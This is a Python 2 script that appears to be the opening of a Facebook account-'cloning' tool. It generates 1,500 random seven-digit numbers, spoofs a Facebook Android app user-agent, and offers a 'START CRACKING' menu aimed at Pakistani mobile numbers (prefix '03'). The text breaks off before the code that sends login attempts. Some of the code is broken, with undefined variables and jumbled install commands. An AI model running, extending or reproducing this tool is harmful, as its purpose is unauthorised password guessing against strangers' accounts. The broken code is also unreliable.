#!/usr/bin/python2
#coding=utf-8
#instagram_igclasherXesports
#Don't-Edit-My-Coding


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(1500):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [⏳⌛] \x1b[1;92mLoa\x1b[1;93mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     'MR', '      ', 'Khan', '      ', 'TRICKER', '      ', 'S', '      ', 'H', '      ', 'A', '      ', 'D', '      ', 'O', '      ', '4', '      ', '0', '4', '      ', 'MR', '      ', 'UNKNOWN', '      ', 'TRICKER', '      ', 'STAR', '      ', 'BOY', '      ', 'DEVOLPER', '      ', 'CONTACT', '      ', 'INSTAGRAM', '      ', 'ig_clasherXesports\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.5)




back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;91m----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----
\033[1;92m-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-**-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-




\033[1;93m███╗░░░███╗██████╗░\033[1;95mKhan
\033[1;96m████╗░████║██╔══██╗
\033[1;97m██╔████╔██║██████╔╝
\033[1;97m██║╚██╔╝██║██╔══██╗
\033[1;96m██║░╚═╝░██║██║░░██║
\033[1;93m╚═╝░░░░░╚═╝╚═╝░░╚═╝\033[1;95mKhan


\033[1;93m♪♪♪♪♪♪♪┏━━━━┳━━━┳━━┳━━━┳┓┏━┳━━━┳━━━┓
\033[1;96m♪♪♪♪♪♪♪┃┏┓┏┓┃┏━┓┣┫┣┫┏━┓┃┃┃┏┫┏━━┫┏━┓┃
\033[1;96m♪♪♪♪♪♪♪┗┛┃┃┗┫┗━┛┃┃┃┃┃╋┗┫┗┛┛┃┗━━┫┗━┛┃\x1b[1;91m[ UPDATED\x1b[1;92m 9.8 ]
\033[1;97m♪♪♪♪♪♪♪╋╋┃┃╋┃┏┓┏┛┃┃┃┃╋┏┫┏┓┃┃┏━━┫┏┓┏┛
\033[1;97m♪♪♪♪♪♪♪╋╋┃┃╋┃┃┃┗┳┫┣┫┗━┛┃┃┃┗┫┗━━┫┃┃┗┓
\033[1;96m♪♪♪♪♪♪♪╋╋┗┛╋┗┛┗━┻━━┻━━━┻┛┗━┻━━━┻┛┗━┛

\033[1;93m----*----*----*----*----*----*----*----*
\033[1;94m----*----*----*----*----*----*----*----*

"""

####Logo####

logo1 = """

____________.♥.
____________.♥♫♥.____________.♥. *
____________.♥♫♥♫.______-.♥♫♥. * 
____________.♥♫♥♫♥._-.♥♫♥♫. * 
_____________.♥♫♥♫♥♫♥♫♥♫♥. *
______-.♥♫♥♫♥♫♥♫♥♫♥♫♥. *
_.♥♫♥♫♥♫♥♥♫♥♫♥♫♥♥♫♥♫♥. * . * 
______-.♥♫♥♫♥♫♥♫♥♫♥♫♥. * . * . * ..
___________.♥♫♥♫♥♫♥♫♥♫♥. * . * . * ..
____________.♥♫♥♫♥._-.♫♥♫♥. * . *. * . * ..
____________.♫♥♫♥.______-.♥♫♥. * .* ..
____________.♥♫♥.____________.♥. * . *.
_____________.♥

\033[1;92m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■▶▶▶
\033[1;91m███╗░░░███╗██████╗░\033[1;95mU̶N̶K̶N̶O̶W̶N̶
\033[1;91m████╗░████║██╔══██╗
\033[1;93m██╔████╔██║██████╔╝
\033[1;93m██║╚██╔╝██║██╔══██╗
\033[1;96m██║░╚═╝░██║██║░░██║
\033[1;96m╚═╝░░░░░╚═╝╚═╝░░╚═╝\033[1;95mT̶R̶I̶C̶K̶E̶R̶
\033[1;91m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■▶▶▶
\033[1;96m♪♪♪♪♪♪♪┏━━━━┳━━━┳━━┳━━━┳┓┏━┳━━━┳━━━┓
\033[1;96m♪♪♪♪♪♪♪┃┏┓┏┓┃┏━┓┣┫┣┫┏━┓┃┃┃┏┫┏━━┫┏━┓┃
\033[1;95m♪♪♪♪♪♪♪┗┛┃┃┗┫┗━┛┃┃┃┃┃╋┗┫┗┛┛┃┗━━┫┗━┛┃\x1b[1;91m[ UPDATED\x1b[1;92m 9.8 ]
\033[1;95m♪♪♪♪♪♪♪╋╋┃┃╋┃┏┓┏┛┃┃┃┃╋┏┫┏┓┃┃┏━━┫┏┓┏┛
\033[1;97m♪♪♪♪♪♪♪╋╋┃┃╋┃┃┃┗┳┫┣┫┗━┛┃┃┃┗┫┗━━┫┃┃┗┓
\033[1;97m♪♪♪♪♪♪♪╋╋┗┛╋┗┛┗━┻━━┻━━━┻┛┗━┻━━━┻┛┗━┛
\033[1;92m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■▶▶▶
\033[1;91m ⭕⭕⭕NOTE::::::::::::::
\033[1;93m USE FAST 4G INTERNET
\033[1;95m FAST CLONING K LIA 4/GB SA
 USE 4GB/6GB RAM MOBILE PHONE🔥
 Don't Miss Use 👈👈👈

"""
logo2 = """


\033[1;96m░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗
\033[1;96m██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║
\033[1;97m╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝
\033[1;97m░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░
\033[1;95m██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░
\033[1;95m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░
                                                                                                                                         
                                  

■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■▶▶▶                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
"""     
CorrectUsername = "Khan"
CorrectPassword = "Khan"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;93mUNKNOWN USERNAME\x1b[1;97m▶▶\x1b[1;92m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;95mUNKNOWN PASSWORD \x1b[1;97m▶▶\x1b[1;91m")
        if (password == CorrectPassword):
            print "\033[1;96mUnknown Tool login successfully as ▶▶▶▶" + username #Dev:Khan
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCktBzi4SXwlruKHocpco4Mg')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCktBzi4SXwlruKHocpco4Mg')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    lodhirt()
    print "\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;93m╾SELECT NUMBER╼\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■"
    time.sleep(0.05)
    print "\033[1;97m[1]\x1b[1;92m  [ START\x1b[1;92m CRACKING ] "  
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m  Exit ( Back)'
    print'\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■\033[1;96m■\033[1;95m■'
    pilih_login()

def pilih_login():
    bch = raw_input('\n\n \x1b[1;97m>>>>\033[1;96m    ')
    if bch == '':
        print '[!] Fill in correctly'
        pilih_login()
    elif bch == '1':
        tik()
    os.system('clear')
    print logo1
    lodhirt()
    print'\033[1;95m●■■■■■■■■■■■■\033[1;92m°SELECT°\033[1;94m■■■■■■■■■■■■●'
    time.sleep(0.10)
    print'\033[1;93m■■■■■■■■■■■■■■■■■■■■'
    print '\x1b[1;97m[1>>>] \033[1;92mPAK\033[1;97mISTAN'
    time.sleep(0.10)
    print '\x1b[1;94m[0>>>] \033[1;91mBACK'
    print'\033[1;93m■■■■■■■■■■■■■■■■■■■■'
    time.sleep(0.10)
    print'\033[1;95m●■■■■■■■\x1b[1;91mMR-UNKNOWN-TRICKER\033[1;94m■■■■■■■●'
   
   
    time.sleep(0.05)
    action()

def action():
    bch = raw_input('\n\n \x1b[1;95m>>>> \033[1;91m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system("clear")
        print logo1
        lodhirt()
       
        print'\033[1;92m╔═╦══╦╦\033[1;97m╦══╦══╦══╦══╦═╦╗'
        print'\033[1;92m║╬║╔╗║╔\033[1;97m╩║║╣══╬╗╔╣╔╗║║║║'
        print'\033[1;92m║╔╣╠╣║╚\033[1;97m╦║║╬══║║║║╠╣║║║║'
        print'\033[1;92m╚╝╚╝╚╩╩\033[1;97m╩══╩══╝╚╝╚╝╚╩╩═╝'
        print'\033[1;91m YOUTUBE CHANNEL MR Khan TRICKER'
        print "\033[1;93m Enter any Pakistan Mobile code Number"+'\n'
        print '\033[1;95m [ Enter any code <1:::To:::49> ] '
        print '\033[1;94m USE FAST 4G INTERNET  '
        
        try:
            c = raw_input("\033[1;92mCHO\x1b[1;93mOSE : \033[1;96m ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input("\n[ Back ]")
            menu()
    elif bch =='0':
